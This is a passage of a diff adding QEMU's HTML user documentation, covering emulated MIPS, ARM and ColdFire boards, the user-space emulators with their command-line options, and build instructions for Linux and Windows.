+     <ul>
+<li>A generic ISA PC-like machine "mips"
+<li>The MIPS Malta prototype board "malta"
+<li>An ACER Pica "pica61". This machine needs the 64-bit emulator. 
+<li>MIPS emulator pseudo board "mipssim"
+<li>A MIPS Magnum R4000 machine "magnum". This machine needs the 64-bit emulator. 
+</ul>
+
+<p>The generic emulation is supported by Debian 'Etch' and is able to
+install Debian into a virtual disk image. The following devices are
+emulated:
+
+     <ul>
+<li>A range of MIPS CPUs, default is the 24Kf
+<li>PC style serial port
+<li>PC style IDE disk
+<li>NE2000 network card
+</ul>
+
+<p>The Malta emulation supports the following devices:
+
+     <ul>
+<li>Core board with MIPS 24Kf CPU and Galileo system controller
+<li>PIIX4 PCI/USB/SMbus controller
+<li>The Multi-I/O chip's serial device
+<li>PCI network cards (PCnet32 and others)
+<li>Malta FPGA serial device
+<li>Cirrus (default) or any other PCI VGA graphics card
+</ul>
+
+<p>The ACER Pica emulation supports:
+
+     <ul>
+<li>MIPS R4000 CPU
+<li>PC-style IRQ and DMA controllers
+<li>PC Keyboard
+<li>IDE controller
+</ul>
+
+<p>The mipssim pseudo board emulation provides an environment similiar
+to what the proprietary MIPS emulator uses for running Linux. 
+It supports:
+
+     <ul>
+<li>A range of MIPS CPUs, default is the 24Kf
+<li>PC style serial port
+<li>MIPSnet network emulation
+</ul>
+
+<p>The MIPS Magnum R4000 emulation supports:
+
+     <ul>
+<li>MIPS R4000 CPU
+<li>PC-style IRQ controller
+<li>PC Keyboard
+<li>SCSI controller
+<li>G364 framebuffer
+</ul>
+
+<p><a name="ARM-System-emulator"></a>
+
+<h3 class="section">4.5 ARM System emulator</h3>
+
+<p><a name="index-system-emulation-_0028ARM_0029-206"></a>
+Use the executable <samp><span class="file">qemu-system-arm</span></samp> to simulate a ARM
+machine. The ARM Integrator/CP board is emulated with the following
+devices:
+
+     <ul>
+<li>ARM926E, ARM1026E, ARM946E, ARM1136 or Cortex-A8 CPU
+<li>Two PL011 UARTs
+<li>SMC 91c111 Ethernet adapter
+<li>PL110 LCD controller
+<li>PL050 KMI with PS/2 keyboard and mouse. 
+<li>PL181 MultiMedia Card Interface with SD card. 
+</ul>
+
+<p>The ARM Versatile baseboard is emulated with the following devices:
+
+     <ul>
+<li>ARM926E, ARM1136 or Cortex-A8 CPU
+<li>PL190 Vectored Interrupt Controller
+<li>Four PL011 UARTs
+<li>SMC 91c111 Ethernet adapter
+<li>PL110 LCD controller
+<li>PL050 KMI with PS/2 keyboard and mouse. 
+<li>PCI host bridge.  Note the emulated PCI bridge only provides access to
+PCI memory space.  It does not provide access to PCI IO space. 
+This means some devices (eg. ne2k_pci NIC) are not usable, and others
+(eg. rtl8139 NIC) are only usable when the guest drivers use the memory
+mapped control registers. 
+<li>PCI OHCI USB controller. 
+<li>LSI53C895A PCI SCSI Host Bus Adapter with hard disk and CD-ROM devices. 
+<li>PL181 MultiMedia Card Interface with SD card. 
+</ul>
+
+<p>Several variants of the ARM RealView baseboard are emulated,
+including the EB, PB-A8 and PBX-A9.  Due to interactions with the
+bootloader, only certain Linux kernel configurations work out
+of the box on these boards.
+
+<p>Kernels for the PB-A8 board should have CONFIG_REALVIEW_HIGH_PHYS_OFFSET
+enabled in the kernel, and expect 512M RAM.  Kernels for The PBX-A9 board
+should have CONFIG_SPARSEMEM enabled, CONFIG_REALVIEW_HIGH_PHYS_OFFSET
+disabled and expect 1024M RAM.
+
+<p>The following devices are emulated:
+
+     <ul>
+<li>ARM926E, ARM1136, ARM11MPCore, Cortex-A8 or Cortex-A9 MPCore CPU
+<li>ARM AMBA Generic/Distributed Interrupt Controller
+<li>Four PL011 UARTs
+<li>SMC 91c111 or SMSC LAN9118 Ethernet adapter
+<li>PL110 LCD controller
+<li>PL050 KMI with PS/2 keyboard and mouse
+<li>PCI host bridge
+<li>PCI OHCI USB controller
+<li>LSI53C895A PCI SCSI Host Bus Adapter with hard disk and CD-ROM devices
+<li>PL181 MultiMedia Card Interface with SD card. 
+</ul>
+
+<p>The XScale-based clamshell PDA models ("Spitz", "Akita", "Borzoi"
+and "Terrier") emulation includes the following peripherals:
+
+     <ul>
+<li>Intel PXA270 System-on-chip (ARM V5TE core)
+<li>NAND Flash memory
+<li>IBM/Hitachi DSCM microdrive in a PXA PCMCIA slot - not in "Akita"
+<li>On-chip OHCI USB controller
+<li>On-chip LCD controller
+<li>On-chip Real Time Clock
+<li>TI ADS7846 touchscreen controller on SSP bus
+<li>Maxim MAX1111 analog-digital converter on I^2C bus
+<li>GPIO-connected keyboard controller and LEDs
+<li>Secure Digital card connected to PXA MMC/SD host
+<li>Three on-chip UARTs
+<li>WM8750 audio CODEC on I^2C and I^2S busses
+</ul>
+
+<p>The Palm Tungsten|E PDA (codename "Cheetah") emulation includes the
+following elements:
+
+     <ul>
+<li>Texas Instruments OMAP310 System-on-chip (ARM 925T core)
+<li>ROM and RAM memories (ROM firmware image can be loaded with -option-rom)
+<li>On-chip LCD controller
+<li>On-chip Real Time Clock
+<li>TI TSC2102i touchscreen controller / analog-digital converter / Audio
+CODEC, connected through MicroWire and I^2S busses
+<li>GPIO-connected matrix keypad
+<li>Secure Digital card connected to OMAP MMC/SD host
+<li>Three on-chip UARTs
+</ul>
+
+<p>Nokia N800 and N810 internet tablets (known also as RX-34 and RX-44 / 48)
+emulation supports the following elements:
+
+     <ul>
+<li>Texas Instruments OMAP2420 System-on-chip (ARM 1136 core)
+<li>RAM and non-volatile OneNAND Flash memories
+<li>Display connected to EPSON remote framebuffer chip and OMAP on-chip
+display controller and a LS041y3 MIPI DBI-C controller
+<li>TI TSC2301 (in N800) and TI TSC2005 (in N810) touchscreen controllers
+driven through SPI bus
+<li>National Semiconductor LM8323-controlled qwerty keyboard driven
+through I^2C bus
+<li>Secure Digital card connected to OMAP MMC/SD host
+<li>Three OMAP on-chip UARTs and on-chip STI debugging console
+<li>A Bluetooth(R) transceiver and HCI connected to an UART
+<li>Mentor Graphics "Inventra" dual-role USB controller embedded in a TI
+TUSB6010 chip - only USB host mode is supported
+<li>TI TMP105 temperature sensor driven through I^2C bus
+<li>TI TWL92230C power management companion with an RTC on I^2C bus
+<li>Nokia RETU and TAHVO multi-purpose chips with an RTC, connected
+through CBUS
+</ul>
+
+<p>The Luminary Micro Stellaris LM3S811EVB emulation includes the following
+devices:
+
+     <ul>
+<li>Cortex-M3 CPU core. 
+<li>64k Flash and 8k SRAM. 
+<li>Timers, UARTs, ADC and I^2C interface. 
+<li>OSRAM Pictiva 96x16 OLED with SSD0303 controller on I^2C bus. 
+</ul>
+
+<p>The Luminary Micro Stellaris LM3S6965EVB emulation includes the following
+devices:
+
+     <ul>
+<li>Cortex-M3 CPU core. 
+<li>256k Flash and 64k SRAM. 
+<li>Timers, UARTs, ADC, I^2C and SSI interfaces. 
+<li>OSRAM Pictiva 128x64 OLED with SSD0323 controller connected via SSI. 
+</ul>
+
+<p>The Freecom MusicPal internet radio emulation includes the following
+elements:
+
+     <ul>
+<li>Marvell MV88W8618 ARM core. 
+<li>32 MB RAM, 256 KB SRAM, 8 MB flash. 
+<li>Up to 2 16550 UARTs
+<li>MV88W8xx8 Ethernet controller
+<li>MV88W8618 audio controller, WM8750 CODEC and mixer
+<li>12864 display with brightness control
+<li>2 buttons, 2 navigation wheels with button function
+</ul>
+
+<p>The Siemens SX1 models v1 and v2 (default) basic emulation. 
+The emulation includes the following elements:
+
+     <ul>
+<li>Texas Instruments OMAP310 System-on-chip (ARM 925T core)
+<li>ROM and RAM memories (ROM firmware image can be loaded with -pflash)
+V1
+1 Flash of 16MB and 1 Flash of 8MB
+V2
+1 Flash of 32MB
+<li>On-chip LCD controller
+<li>On-chip Real Time Clock
+<li>Secure Digital card connected to OMAP MMC/SD host
+<li>Three on-chip UARTs
+</ul>
+
+<p>The "Syborg" Symbian Virtual Platform base model includes the following
+elements:
+
+     <ul>
+<li>ARM Cortex-A8 CPU
+<li>Interrupt controller
+<li>Timer
+<li>Real Time Clock
+<li>Keyboard
+<li>Framebuffer
+<li>Touchscreen
+<li>UARTs
+</ul>
+
+<p>A Linux 2.6 test image is available on the QEMU web site. More
+information is available in the QEMU mailing-list archive.
+
+<!-- man begin OPTIONS -->
+<p>The following options are specific to the ARM emulation:
+
+     <dl>
+<dt><samp><span class="option">-semihosting</span></samp><dd>Enable semihosting syscall emulation.
+
+     <p>On ARM this implements the "Angel" interface.
+
+     <p>Note that this allows guest direct access to the host filesystem,
+so should only be used with trusted guest OS.
+
+</dl>
+
+<p><a name="ColdFire-System-emulator"></a>
+
+<h3 class="section">4.6 ColdFire System emulator</h3>
+
+<p><a name="index-system-emulation-_0028ColdFire_0029-207"></a><a name="index-system-emulation-_0028M68K_0029-208"></a>
+Use the executable <samp><span class="file">qemu-system-m68k</span></samp> to simulate a ColdFire machine. 
+The emulator is able to boot a uClinux kernel.
+
+<p>The M5208EVB emulation includes the following devices:
+
+     <ul>
+<li>MCF5208 ColdFire V2 Microprocessor (ISA A+ with EMAC). 
+<li>Three Two on-chip UARTs. 
+<li>Fast Ethernet Controller (FEC)
+</ul>
+
+<p>The AN5206 emulation includes the following devices:
+
+     <ul>
+<li>MCF5206 ColdFire V2 Microprocessor. 
+<li>Two on-chip UARTs. 
+</ul>
+
+<!-- man begin OPTIONS -->
+<p>The following options are specific to the ColdFire emulation:
+
+     <dl>
+<dt><samp><span class="option">-semihosting</span></samp><dd>Enable semihosting syscall emulation.
+
+     <p>On M68K this implements the "ColdFire GDB" interface used by libgloss.
+
+     <p>Note that this allows guest direct access to the host filesystem,
+so should only be used with trusted guest OS.
+
+</dl>
+
+<p><a name="Cris-System-emulator"></a>
+
+<h3 class="section">4.7 Cris System emulator</h3>
+
+<p><a name="index-system-emulation-_0028Cris_0029-209"></a>
+TODO
+
+<p><a name="Microblaze-System-emulator"></a>
+
+<h3 class="section">4.8 Microblaze System emulator</h3>
+
+<p><a name="index-system-emulation-_0028Microblaze_0029-210"></a>
+TODO
+
+<p><a name="SH4-System-emulator"></a>
+
+<h3 class="section">4.9 SH4 System emulator</h3>
+
+<p><a name="index-system-emulation-_0028SH4_0029-211"></a>
+TODO
+
+<p><a name="QEMU-User-space-emulator"></a>
+
+<h2 class="chapter">5 QEMU User space emulator</h2>
+
+<p><a name="Supported-Operating-Systems"></a>
+
+<h3 class="section">5.1 Supported Operating Systems</h3>
+
+<p>The following OS are supported in user space emulation:
+
+     <ul>
+<li>Linux (referred as qemu-linux-user)
+<li>Mac OS X/Darwin (referred as qemu-darwin-user)
+<li>BSD (referred as qemu-bsd-user)
+</ul>
+
+<p><a name="Linux-User-space-emulator"></a>
+
+<h3 class="section">5.2 Linux User space emulator</h3>
+
+<p><a name="Quick-Start"></a>
+
+<h4 class="subsection">5.2.1 Quick Start</h4>
+
+<p>In order to launch a Linux process, QEMU needs the process executable
+itself and all the target (x86) dynamic libraries used by it.
+
+     <ul>
+<li>On x86, you can just try to launch any process by using the native
+libraries:
+
+     <pre class="example">     qemu-i386 -L / /bin/ls
+</pre>
+     <p><code>-L /</code> tells that the x86 dynamic linker must be searched with a
+<samp><span class="file">/</span></samp> prefix.
+
+     <li>Since QEMU is also a linux process, you can launch qemu with
+qemu (NOTE: you can only do that if you compiled QEMU from the sources):
+
+     <pre class="example">     qemu-i386 -L / qemu-i386 -L / /bin/ls
+</pre>
+     <li>On non x86 CPUs, you need first to download at least an x86 glibc
+(<samp><span class="file">qemu-runtime-i386-XXX-.tar.gz</span></samp> on the QEMU web page). Ensure that
+<code>LD_LIBRARY_PATH</code> is not set:
+
+     <pre class="example">     unset LD_LIBRARY_PATH
+</pre>
+     <p>Then you can launch the precompiled <samp><span class="file">ls</span></samp> x86 executable:
+
+     <pre class="example">     qemu-i386 tests/i386/ls
+</pre>
+     <p>You can look at <samp><span class="file">scripts/qemu-binfmt-conf.sh</span></samp> so that
+QEMU is automatically launched by the Linux kernel when you try to
+launch x86 executables. It requires the <code>binfmt_misc</code> module in the
+Linux kernel.
+
+     <li>The x86 version of QEMU is also included. You can try weird things such as:
+     <pre class="example">     qemu-i386 /usr/local/qemu-i386/bin/qemu-i386 \
+               /usr/local/qemu-i386/bin/ls-i386
+</pre>
+     </ul>
+
+<p><a name="Wine-launch"></a>
+
+<h4 class="subsection">5.2.2 Wine launch</h4>
+
+     <ul>
+<li>Ensure that you have a working QEMU with the x86 glibc
+distribution (see previous section). In order to verify it, you must be
+able to do:
+
+     <pre class="example">     qemu-i386 /usr/local/qemu-i386/bin/ls-i386
+</pre>
+     <li>Download the binary x86 Wine install
+(<samp><span class="file">qemu-XXX-i386-wine.tar.gz</span></samp> on the QEMU web page).
+
+     <li>Configure Wine on your account. Look at the provided script
+<samp><span class="file">/usr/local/qemu-i386/bin/wine-conf.sh</span></samp>. Your previous
+<code>${HOME}/.wine</code> directory is saved to <code>${HOME}/.wine.org</code>.
+
+     <li>Then you can try the example <samp><span class="file">putty.exe</span></samp>:
+
+     <pre class="example">     qemu-i386 /usr/local/qemu-i386/wine/bin/wine \
+               /usr/local/qemu-i386/wine/c/Program\ Files/putty.exe
+</pre>
+     </ul>
+
+<p><a name="Command-line-options"></a>
+
+<h4 class="subsection">5.2.3 Command line options</h4>
+
+<pre class="example">usage: qemu-i386 [-h] [-d] [-L path] [-s size] [-cpu model] [-g port] [-B offset] [-R size] program [arguments...]
+</pre>
+     <dl>
+<dt><samp><span class="option">-h</span></samp><dd>Print the help
+<br><dt><samp><span class="option">-L path</span></samp><dd>Set the x86 elf interpreter prefix (default=/usr/local/qemu-i386)
+<br><dt><samp><span class="option">-s size</span></samp><dd>Set the x86 stack size in bytes (default=524288)
+<br><dt><samp><span class="option">-cpu model</span></samp><dd>Select CPU model (-cpu ? for list and additional feature selection)
+<br><dt><samp><span class="option">-ignore-environment</span></samp><dd>Start with an empty environment. Without this option,
+the initial environment is a copy of the caller's environment. 
+<br><dt><samp><span class="option">-E </span><var>var</var><span class="option">=</span><var>value</var></samp><dd>Set environment <var>var</var> to <var>value</var>. 
+<br><dt><samp><span class="option">-U </span><var>var</var></samp><dd>Remove <var>var</var> from the environment. 
+<br><dt><samp><span class="option">-B offset</span></samp><dd>Offset guest address by the specified number of bytes.  This is useful when
+the address region required by guest applications is reserved on the host. 
+This option is currently only supported on some hosts. 
+<br><dt><samp><span class="option">-R size</span></samp><dd>Pre-allocate a guest virtual address space of the given size (in bytes). 
+"G", "M", and "k" suffixes may be used when specifying the size. 
+</dl>
+
+<p>Debug options:
+
+     <dl>
+<dt><samp><span class="option">-d</span></samp><dd>Activate log (logfile=/tmp/qemu.log)
+<br><dt><samp><span class="option">-p pagesize</span></samp><dd>Act as if the host page size was 'pagesize' bytes
+<br><dt><samp><span class="option">-g port</span></samp><dd>Wait gdb connection to port
+<br><dt><samp><span class="option">-singlestep</span></samp><dd>Run the emulation in single step mode. 
+</dl>
+
+<p>Environment variables:
+
+     <dl>
+<dt><samp><span class="env">QEMU_STRACE</span></samp><dd>Print system calls and arguments similar to the 'strace' program
+(NOTE: the actual 'strace' program will not work because the user
+space emulator hasn't implemented ptrace).  At the moment this is
+incomplete.  All system calls that don't have a specific argument
+format are printed with information for six arguments.  Many
+flag-style arguments don't have decoders and will show up as numbers. 
+</dl>
+
+<p><a name="Other-binaries"></a>
+
+<h4 class="subsection">5.2.4 Other binaries</h4>
+
+<p><a name="index-user-mode-_0028Alpha_0029-212"></a><samp><span class="command">qemu-alpha</span></samp> TODO.
+
+<p><a name="index-user-mode-_0028ARM_0029-213"></a><samp><span class="command">qemu-armeb</span></samp> TODO.
+
+<p><a name="index-user-mode-_0028ARM_0029-214"></a><samp><span class="command">qemu-arm</span></samp> is also capable of running ARM "Angel" semihosted ELF
+binaries (as implemented by the arm-elf and arm-eabi Newlib/GDB
+configurations), and arm-uclinux bFLT format binaries.
+
+<p><a name="index-user-mode-_0028ColdFire_0029-215"></a><a name="index-user-mode-_0028M68K_0029-216"></a><samp><span class="command">qemu-m68k</span></samp> is capable of running semihosted binaries using the BDM
+(m5xxx-ram-hosted.ld) or m68k-sim (sim.ld) syscall interfaces, and
+coldfire uClinux bFLT format binaries.
+
+<p>The binary format is detected automatically.
+
+<p><a name="index-user-mode-_0028Cris_0029-217"></a><samp><span class="command">qemu-cris</span></samp> TODO.
+
+<p><a name="index-user-mode-_0028i386_0029-218"></a><samp><span class="command">qemu-i386</span></samp> TODO. 
+<samp><span class="command">qemu-x86_64</span></samp> TODO.
+
+<p><a name="index-user-mode-_0028Microblaze_0029-219"></a><samp><span class="command">qemu-microblaze</span></samp> TODO.
+
+<p><a name="index-user-mode-_0028MIPS_0029-220"></a><samp><span class="command">qemu-mips</span></samp> TODO. 
+<samp><span class="command">qemu-mipsel</span></samp> TODO.
+
+<p><a name="index-user-mode-_0028PowerPC_0029-221"></a><samp><span class="command">qemu-ppc64abi32</span></samp> TODO. 
+<samp><span class="command">qemu-ppc64</span></samp> TODO. 
+<samp><span class="command">qemu-ppc</span></samp> TODO.
+
+<p><a name="index-user-mode-_0028SH4_0029-222"></a><samp><span class="command">qemu-sh4eb</span></samp> TODO. 
+<samp><span class="command">qemu-sh4</span></samp> TODO.
+
+<p><a name="index-user-mode-_0028SPARC_0029-223"></a><samp><span class="command">qemu-sparc</span></samp> can execute Sparc32 binaries (Sparc32 CPU, 32 bit ABI).
+
+<p><samp><span class="command">qemu-sparc32plus</span></samp> can execute Sparc32 and SPARC32PLUS binaries
+(Sparc64 CPU, 32 bit ABI).
+
+<p><samp><span class="command">qemu-sparc64</span></samp> can execute some Sparc64 (Sparc64 CPU, 64 bit ABI) and
+SPARC32PLUS binaries (Sparc64 CPU, 32 bit ABI).
+
+<p><a name="Mac-OS-X%2fDarwin-User-space-emulator"></a>
+<a name="Mac-OS-X_002fDarwin-User-space-emulator"></a>
+
+<h3 class="section">5.3 Mac OS X/Darwin User space emulator</h3>
+
+<p><a name="Mac-OS-X%2fDarwin-Status"></a>
+<a name="Mac-OS-X_002fDarwin-Status"></a>
+
+<h4 class="subsection">5.3.1 Mac OS X/Darwin Status</h4>
+
+     <ul>
+<li>target x86 on x86: Most apps (Cocoa and Carbon too) works. [1]
+<li>target PowerPC on x86: Not working as the ppc commpage can't be mapped (yet!) 
+<li>target PowerPC on PowerPC: Most apps (Cocoa and Carbon too) works. [1]
+<li>target x86 on PowerPC: most utilities work. Cocoa and Carbon apps are not yet supported. 
+</ul>
+
+<p>[1] If you're host commpage can be executed by qemu.
+
+<p><a name="Mac-OS-X%2fDarwin-Quick-Start"></a>
+<a name="Mac-OS-X_002fDarwin-Quick-Start"></a>
+
+<h4 class="subsection">5.3.2 Quick Start</h4>
+
+<p>In order to launch a Mac OS X/Darwin process, QEMU needs the process executable
+itself and all the target dynamic libraries used by it. If you don't have the FAT
+libraries (you're running Mac OS X/ppc) you'll need to obtain it from a Mac OS X
+CD or compile them by hand.
+
+     <ul>
+<li>On x86, you can just try to launch any process by using the native
+libraries:
+
+     <pre class="example">     qemu-i386 /bin/ls
+</pre>
+     <p>or to run the ppc version of the executable:
+
+     <pre class="example">     qemu-ppc /bin/ls
+</pre>
+     <li>On ppc, you'll have to tell qemu where your x86 libraries (and dynamic linker)
+are installed:
+
+     <pre class="example">     qemu-i386 -L /opt/x86_root/ /bin/ls
+</pre>
+     <p><code>-L /opt/x86_root/</code> tells that the dynamic linker (dyld) path is in
+<samp><span class="file">/opt/x86_root/usr/bin/dyld</span></samp>.
+
+</ul>
+
+<p><a name="Mac-OS-X%2fDarwin-Command-line-options"></a>
+<a name="Mac-OS-X_002fDarwin-Command-line-options"></a>
+
+<h4 class="subsection">5.3.3 Command line options</h4>
+
+<pre class="example">usage: qemu-i386 [-h] [-d] [-L path] [-s size] program [arguments...]
+</pre>
+     <dl>
+<dt><samp><span class="option">-h</span></samp><dd>Print the help
+<br><dt><samp><span class="option">-L path</span></samp><dd>Set the library root path (default=/)
+<br><dt><samp><span class="option">-s size</span></samp><dd>Set the stack size in bytes (default=524288)
+</dl>
+
+<p>Debug options:
+
+     <dl>
+<dt><samp><span class="option">-d</span></samp><dd>Activate log (logfile=/tmp/qemu.log)
+<br><dt><samp><span class="option">-p pagesize</span></samp><dd>Act as if the host page size was 'pagesize' bytes
+<br><dt><samp><span class="option">-singlestep</span></samp><dd>Run the emulation in single step mode. 
+</dl>
+
+<p><a name="BSD-User-space-emulator"></a>
+
+<h3 class="section">5.4 BSD User space emulator</h3>
+
+<p><a name="BSD-Status"></a>
+
+<h4 class="subsection">5.4.1 BSD Status</h4>
+
+     <ul>
+<li>target Sparc64 on Sparc64: Some trivial programs work. 
+</ul>
+
+<p><a name="BSD-Quick-Start"></a>
+
+<h4 class="subsection">5.4.2 Quick Start</h4>
+
+<p>In order to launch a BSD process, QEMU needs the process executable
+itself and all the target dynamic libraries used by it.
+
+     <ul>
+<li>On Sparc64, you can just try to launch any process by using the native
+libraries:
+
+     <pre class="example">     qemu-sparc64 /bin/ls
+</pre>
+     </ul>
+
+<p><a name="BSD-Command-line-options"></a>
+
+<h4 class="subsection">5.4.3 Command line options</h4>
+
+<pre class="example">usage: qemu-sparc64 [-h] [-d] [-L path] [-s size] [-bsd type] program [arguments...]
+</pre>
+     <dl>
+<dt><samp><span class="option">-h</span></samp><dd>Print the help
+<br><dt><samp><span class="option">-L path</span></samp><dd>Set the library root path (default=/)
+<br><dt><samp><span class="option">-s size</span></samp><dd>Set the stack size in bytes (default=524288)
+<br><dt><samp><span class="option">-ignore-environment</span></samp><dd>Start with an empty environment. Without this option,
+the initial environment is a copy of the caller's environment. 
+<br><dt><samp><span class="option">-E </span><var>var</var><span class="option">=</span><var>value</var></samp><dd>Set environment <var>var</var> to <var>value</var>. 
+<br><dt><samp><span class="option">-U </span><var>var</var></samp><dd>Remove <var>var</var> from the environment. 
+<br><dt><samp><span class="option">-bsd type</span></samp><dd>Set the type of the emulated BSD Operating system. Valid values are
+FreeBSD, NetBSD and OpenBSD (default). 
+</dl>
+
+<p>Debug options:
+
+     <dl>
+<dt><samp><span class="option">-d</span></samp><dd>Activate log (logfile=/tmp/qemu.log)
+<br><dt><samp><span class="option">-p pagesize</span></samp><dd>Act as if the host page size was 'pagesize' bytes
+<br><dt><samp><span class="option">-singlestep</span></samp><dd>Run the emulation in single step mode. 
+</dl>
+
+<p><a name="compilation"></a>
+
+<h2 class="chapter">6 Compilation from the sources</h2>
+
+<p><a name="Linux%2fUnix"></a>
+<a name="Linux_002fUnix"></a>
+
+<h3 class="section">6.1 Linux/Unix</h3>
+
+<h4 class="subsection">6.1.1 Compilation</h4>
+
+<p>First you must decompress the sources:
+<pre class="example">cd /tmp
+tar zxvf qemu-x.y.z.tar.gz
+cd qemu-x.y.z
+</pre>
+<p>Then you configure QEMU and build it (usually no options are needed):
+<pre class="example">./configure
+make
+</pre>
+<p>Then type as root user:
+<pre class="example">make install
+</pre>
+<p>to install QEMU in <samp><span class="file">/usr/local</span></samp>.
+
+<p><a name="Windows"></a>
+
+<h3 class="section">6.2 Windows</h3>
+
+     <ul>
+<li>Install the current versions of MSYS and MinGW from
+<a href="http://www.mingw.org/">http://www.mingw.org/</a>. You can find detailed installation
+instructions in the download section and the FAQ.
+
+     <li>Download
+the MinGW development library of SDL 1.2.x
+(<samp><span class="file">SDL-devel-1.2.x-mingw32.tar.gz</span></samp>) from
+<a href="http://www.libsdl.org">http://www.libsdl.org</a>. Unpack it in a temporary place and
+edit the <samp><span class="file">sdl-config</span></samp> script so that it gives the
+correct SDL directory when invoked.
+
+     <li>Install the MinGW version of zlib and make sure
+<samp><span class="file">zlib.h</span></samp> and <samp><span class="file">libz.dll.a</span></samp> are in
+MinGW's default header and linker search paths.
+
+     <li>Extract the current version of QEMU.
+
+     <li>Start the MSYS shell (file <samp><span class="file">msys.bat</span></samp>).
+
+     <li>Change to the QEMU directory. Launch <samp><span class="file">./configure</span></samp> and
+<samp><span class="file">make</span></samp>.  If you have problems using SDL, verify that
+<samp><span class="file">sdl-config</span></samp> can be launched from the MSYS command line.
+
+     <li>You can install QEMU in <samp><span class="file">Program Files/Qemu</span></samp> by typing
+<samp><span class="file">make install</span></samp>. Don't forget to copy <samp><span class="file">SDL.dll</span></samp> in
+<samp><span class="file">Program Files/Qemu</span></samp>.
+
+</ul>
+
+<p><a name="Cross-compilation-for-Windows-with-Linux"></a>
+
+<h3 class="section">6.3 Cross compilation for Windows with Linux</h3>
+
+     <ul>
+<li>Install the MinGW cross compilation tools available at
+<a href="http://www.mingw.org/">http://www.mingw.org/</a>.
+
+     <li>Download
+the MinGW development library of SDL 1.2.x
+(<samp><span class="file">SDL-devel-1.2.x-mingw32.tar.gz</span></samp>) from
+<a href="http://www.libsdl.org">http://www.libsdl.org</a>. Unpack it in a temporary place and
+edit the <samp><span class="file">sdl-config</span></samp> script so that it gives the
+correct SDL directory when invoked.  Set up the <code>PATH</code> environment
+variable so that <samp><span class="file">sdl-config</span></samp> can be launched by
+the QEMU configuration script.
+
+     <li>Install the MinGW version of zlib and make sure
+<samp><span class="file">zlib.h</span></samp> and <samp><span class="file">libz.dll.a</span></samp> are in
+MinGW's default header and linker search paths.
+
+     <li>Configure QEMU for Windows cross compilation:
+     <pre class="example">     PATH=/usr/i686-pc-mingw32/sys-root/mingw/bin:$PATH ./configure --cross-prefix='i686-pc-mingw32-'
+</pre>
+     <p>The example assumes <samp><span class="file">sdl-config</span></samp> is installed under <samp><span class="file">/usr/i686-pc-mingw32/sys-root/mingw/bin</span></samp> and
+MinGW cross compilation tools have names like <samp><span class="file">i686-pc-mingw32-gcc</span></samp> and <samp><span class="file">i686-pc-mingw32-strip</span></samp>. 
+We set the <code>PATH</code> environment variable to ensure the MinGW version of <samp><span class="file">sdl-config</span></samp> is used and
+use &ndash;cross-prefix to specify the name of the cross compiler. 
+You can also use &ndash;prefix to set the Win32 install path which defaults to <samp><span class="file">c:/Program Files/Qemu</span></samp>.
+
+     <p>Under Fedora Linux, you can run:
+     <pre class="example">     yum -y install mingw32-gcc mingw32-SDL mingw32-zlib
+</pre>
+     <p>to get a suitable cross compilation environment.
+
+     <li>You can install QEMU in the installation directory by typing
+<code>make install</code>. Don't forget to copy <samp><span class="file">SDL.dll</span></samp> and <samp><span class="file">zlib1.dll</span></samp> into the
+installation directory.
+
+</ul>
+
+<p>Wine can be used to launch the resulting qemu.exe compiled for Win32.
+
+<p><a name="Mac-OS-X"></a>
+
+<h3 class="section">6.4 Mac OS X</h3>
+
+<p>The Mac OS X patches are not fully merged in QEMU, so you should look
+at the QEMU mailing list archive to have all the necessary
+information.
+
+<p><a name="Make-targets"></a>
+
+<h3 class="section">6.5 Make targets</h3>
+
+     <dl>
+<dt><code>make</code><br><dt><code>make all</code><dd>Make everything which is typically needed.
+
+     <br><dt><code>install</code><dd>TODO
+
+     <br><dt><code>install-doc</code><dd>TODO
+
+     <br><dt><code>make clean</code><dd>Remove most files which were built during make.
+
+     <br><dt><code>make distclean</code><dd>Remove everything which was built during make.
+
+     <br><dt><code>make dvi</code><br><dt><code>make html</code><br><dt><code>make info</code><br><dt><code>make pdf</code><dd>Create documentation in dvi, html, info or pdf format.
+
+     <br><dt><code>make cscope</code><dd>TODO
+
+     <br><dt><code>make defconfig</code><dd>(Re-)create some build configuration files. 
+User made changes will be overwritten.
+
+     <br><dt><code>tar</code><br><dt><code>tarbin</code><dd>TODO
+
+</dl>
+
+<p><a name="License"></a>
+
+<h2 class="appendix">Appendix A License</h2>
+
+<p>QEMU is a trademark of Fabrice Bellard.
+
+<p>QEMU is released under the GNU General Public License (TODO: add link). 
+Parts of QEMU have specific licenses, see file LICENSE.
+
+<p>TODO (refer to file LICENSE, include it, include the GPL?)
+
+<p><a name="Index"></a>
+
+<h2 class="appendix">Appendix B Index</h2>
+
+<p><a name="Concept-Index"></a>
+
+<h3 class="section">B.1 Concept Index</h3>
+
+<p>This is the main index. Should we combine all keywords in one index? TODO
+
+<ul class="index-cp" compact>
+<li><a href="#index-emulated-target-systems-4">emulated target systems</a>: <a href="#intro_005ffeatures">intro_features</a></li>
+<li><a href="#index-installation-_0028Linux_0029-7">installation (Linux)</a>: <a href="#install_005flinux">install_linux</a></li>
+<li><a href="#index-installation-_0028Windows_0029-8">installation (Windows)</a>: <a href="#install_005fwindows">install_windows</a></li>
+<li><a href="#index-operating-modes-1">operating modes</a>: <a href="#intro_005ffeatures">intro_features</a></li>
+<li><a href="#index-QEMU-monitor-130">QEMU monitor</a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-quick-start-10">quick start</a>: <a href="#pcsys_005fquickstart">pcsys_quickstart</a></li>
+<li><a href="#index-supported-target-systems-5">supported target systems</a>: <a href="#intro_005ffeatures">intro_features</a></li>
+<li><a href="#index-supported-user-mode-targets-6">supported user mode targets</a>: <a href="#intro_005ffeatures">intro_features</a></li>
+<li><a href="#index-system-emulation-2">system emulation</a>: <a href="#intro_005ffeatures">intro_features</a></li>
+<li><a href="#index-system-emulation-_0028ARM_0029-206">system emulation (ARM)</a>: <a href="#ARM-System-emulator">ARM System emulator</a></li>
+<li><a href="#index-system-emulation-_0028ColdFire_0029-207">system emulation (ColdFire)</a>: <a href="#ColdFire-System-emulator">ColdFire System emulator</a></li>
+<li><a href="#index-system-emulation-_0028Cris_0029-209">system emulation (Cris)</a>: <a href="#Cris-System-emulator">Cris System emulator</a></li>
+<li><a href="#index-system-emulation-_0028M68K_0029-208">system emulation (M68K)</a>: <a href="#ColdFire-System-emulator">ColdFire System emulator</a></li>
+<li><a href="#index-system-emulation-_0028Microblaze_0029-210">system emulation (Microblaze)</a>: <a href="#Microblaze-System-emulator">Microblaze System emulator</a></li>
